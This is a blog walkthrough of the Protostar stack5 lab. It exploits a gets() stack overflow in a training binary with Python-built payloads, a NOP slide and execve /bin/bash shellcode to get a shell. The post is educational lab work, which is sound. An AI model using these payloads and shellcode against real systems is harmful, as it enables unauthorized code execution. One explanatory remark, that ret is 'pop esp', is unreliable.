---
title: "Protostar stack5 walkthrough"
date: 2020-05-22
tags: [buffer overflow, protostar, stack5, walkthrough]
header:
  image: "/images/protostar/protostar.png"
---

## Protostar exercises - [stack5](https://exploit-exercises.lains.space/protostar/stack5/)

#### About
Stack5 is a standard buffer overflow, this time introducing shellcode.

This level is at /opt/protostar/bin/stack5

Hints

At this point in time, it might be easier to use someone elses shellcode
If debugging the shellcode, use \xcc (int3) to stop the program executing and return to the debugger
remove the int3s once your shellcode is done.

#### Source code:
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

#### Procedure:

We can use `gets()` to write something onto stack. To solve this level, we need to get a reverse shell using shellcode. So, once main function is done executing, we need the ESP to point to shellcode, which we can inject using `gets()`

###### Vulnerability:

`gets()` is vulnerable function.


###### Disassembly:

Lets disassemble the main function
```
gdb ./stack5
(gdb) set disassembly-flavor intel
(gdb) disassemble main
```

![disassembly]({{site.url}}{{site.baseurl}}/images/protostar/stack5/disassemble.png)

Now, lets set breakpoint at the 'ret' of main and run the program with a long input (AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ)

```
break *0x080483da
r
AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
x/8wx $esp
```

![breakpoint]({{site.url}}{{site.baseurl}}/images/protostar/stack5/breakpoint.png)

At the breakpoint, we can see that the value in $esp is 0x56565656 and this will be executed in the next step and leads to segmentation fault. we can see this by continuing with `c`. 
We can use `x/s $esp` to get the esp values as a string

![segfault]({{site.url}}{{site.baseurl}}/images/protostar/stack5/segfault.png)

Instead of getting segmentation fault, we need the program to execute a shell code. Lets start by putting the shell code into $esp after 'ret' is executed

At the 'ret' instruction, $eip = 0x80483da (0x909090c3) and $esp = 0xbffff7cc (0x56565656). Once 'ret' is executed, the return address pointed by esp will be popped (ret is nothing but pop esp) and eip will have the value of return pointer (0x56565656). Now, $eip = 0x56565656(??) and $esp = 0xbffff7d0 (0x57575757). In the next step, eip will try to execute (??) and fails.

Before injecting any shellcode, lets try if we can trigger an input at this step. We need eip to point to interrupt (INT3) opcode (xCC). So we want $eip to have an address containing xCC.
After ret, $eip points to return pointer on stack. We can change this to a controllable address like 0xbffff7d0 where we write xCC.

So, 0xbffff7cc should have 0xbffff7d0 and 0xbffff7d0 should have xCC.
Lets create a payload that matches this with python

```
import struct
padding = 'AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU'
eip = struct.pack("I", 0xbffff7d0)
payload = "\xCC"*4
print padding+eip+payload
```

We can run the program in gdb using `r < /home/user/stack5/pay` where pay is the payload with output of above python program.

![interrup]({{site.url}}{{site.baseurl}}/images/protostar/stack5/interrupt.png)

As expected, address 0xbffff7cc has 0xbffff7d0. So, when we continue, eip will point to 0xbffff7d0 and run whatever is inside it. 0xbffff7d0 has 0xcccccccc which is our interrupt opcode. Now, if we continue `c`, we can see the program giving a SIGTRAP. 

![sigtrap]({{site.url}}{{site.baseurl}}/images/protostar/stack5/sigtrap.png)

This confirms that if shell code is written at 0xbffff7d0, it would execute. Lets use [this](http://shell-storm.org/shellcode/files/shellcode-606.php) shellcode from [shell-storm.org](http://shell-storm.org/)

Lets also add a NOP slide before adding shellcode. NOP slide is a chain of NOP instruction (opcode x90) which does no action. But this is useful since we are hardcoding the addresses in our script and it will not always match with the required address to execute eip. Havin a bunch of NOP instructions serve as a buffer to allow the difference between the actual eip address needed and the one we give in the script. 

```
import struct
padding = 'AAAABBBBCCCCDDDDEEEEFFFFIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUU'
eip = struct.pack("I", 0xbffff7d0+30)
nopslide = "\x90"*100
interrupt = "\xCC"
payload = "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
print padding+eip+nopslide+interrupt+payload
```

Now at 'ret', we can see that $esp has 0xbffff7ee, which is in the middle of NOP slide.

![nopsled]({{site.url}}{{site.baseurl}}/images/protostar/stack5/nopsled.png)

Now, if we continue, we should get an interrupt followed by shell

![shell]({{site.url}}{{site.baseurl}}/images/protostar/stack5/shell.png)

/bin/bash has executed, but since the execution of stack5 is done, the pipe is closed and there is no way to give input to bash.

We can get past this by making `cat` run along with our python program (exploit.py). using `cat` without any input just prints whatever is entered in the prompt. if we can run cat along with stack5, we can have the stdin always available. First lets see if we can successfully run stack5 piping it to the output of exploit.py

`python exploit.py | /opt/protostar/bin/stack5`

![python]({{site.url}}{{site.baseurl}}/images/protostar/stack5/python.png)

Looks like we can run it. Lets remove the interrupt from our script and run stack5 with both python and cat as input.

`(python exploit.py; cat) | /opt/protostar/bin/stack5`

![done]({{site.url}}{{site.baseurl}}/images/protostar/stack5/done.png)

Now we get a shell.

